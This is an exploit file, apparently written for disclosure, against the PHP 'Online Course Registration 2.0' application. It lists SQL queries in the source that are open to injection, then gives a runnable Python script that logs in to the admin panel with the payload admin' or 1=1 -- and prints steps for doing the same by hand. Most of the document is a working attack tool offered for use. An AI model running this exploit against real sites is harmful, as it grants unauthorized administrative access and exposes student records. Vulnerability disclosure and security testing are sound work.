@@ -1,0 +1,69 @@
+# Exploit Title: Online Course Registration 2.0 - Authentication Bypass
+# Google Dork: N/A
+# Date: 2020-04-25
+# Exploit Author: Daniel Monzón (stark0de)
+# Vendor Homepage: https://phpgurukul.com
+# Software Link: https://phpgurukul.com/online-course-registration-free-download/
+# Version: 2.0
+# Tested on: Kali Linux x64 5.4.0
+# CVE : N/A
+
+#There are multiple SQL injection vulnerabilities in Online Course Registration #PHP script:
+
+#./check_availability.php:               $result =mysqli_query($con,"SELECT studentRegno FROM    courseenrolls WHERE course='$cid' and studentRegno=' $regid'");
+#./check_availability.php:               $result =mysqli_query($con,"SELECT * FROM courseenrolls WHERE course='$cid'");
+#./check_availability.php:               $result1 =mysqli_query($con,"SELECT noofSeats FROM course WHERE id='$cid'");
+#./change-password.php:$sql=mysqli_query($con,"SELECT password FROM  students where password='".md5($_POST['cpass'])."' && studentRegno='".$_SESSION['login']."'");
+#./admin/check_availability.php:         $result =mysqli_query($con,"SELECT StudentRegno FROM students WHERE StudentRegno='$regno'");
+#./admin/change-password.php:$sql=mysqli_query($con,"SELECT password FROM  admin where password='".md5($_POST['cpass'])."' && username='".$_SESSION['alogin']."'");
+#./admin/index.php:$query=mysqli_query($con,"SELECT * FROM admin WHERE username='$username' and password='$password'");
+#./index.php:$query=mysqli_query($con,"SELECT * FROM students WHERE StudentRegno='$regno' and password='$password'");
+#./includes/header.php:        $ret=mysqli_query($con,"SELECT  * from userlog where studentRegno='".$_SESSION['login']."' order by id desc limit 1,1");
+#./pincode-verification.php:$sql=mysqli_query($con,"SELECT * FROM  students where pincode='".trim($_POST['pincode'])."' && StudentRegno='".$_SESSION['login']."'");
+
+#It is also possible to bypass the authentication in the two login pages:
+#!/usr/bin/python3
+try:
+   from termcolor import colored 
+   from colorama import init
+   import argparse
+   import requests
+except:
+	print("Please run pip3 install termcolor,colorama,argparse,requests")
+
+init()
+
+symbol_green=colored("[+]", 'green') 
+symbol_red=colored("[-]", 'red') 
+
+parser = argparse.ArgumentParser()
+parser.add_argument('url', help='The URL of the target.')
+args = parser.parse_args()
+
+adminurl = args.url + '/onlinecourse/admin/'
+
+
+
+def main():
+    initial='Online Course Registration Authentication Bypass in %s' % ( args.url ) + "\n"
+    print(colored(initial, 'yellow'))
+    sess = requests.session()
+    data_login = {
+    'username': "admin' or 1=1 -- ",
+    'password': 'whatever',
+    'submit': ''
+}
+    try:
+        req = sess.post(adminurl, data=data_login, verify=False, allow_redirects=True)
+        resp_code = req.status_code
+    except:
+    	print(symbol_red+" The request didn't work!\n")
+    	exit()
+    if resp_code == 200 and "document.chngpwd.cpass.value" in req.text:
+       print(symbol_green+" Authentication bypassed for admin user!\n")
+       print(symbol_green+" To test this manually, visit: " + adminurl+ " and enter: admin' or 1=1 -- in the username field and whatever in password field, then click the Log Me In button\n")
+
+    else:
+       print(symbol_red+" Fail!")
+
+main()
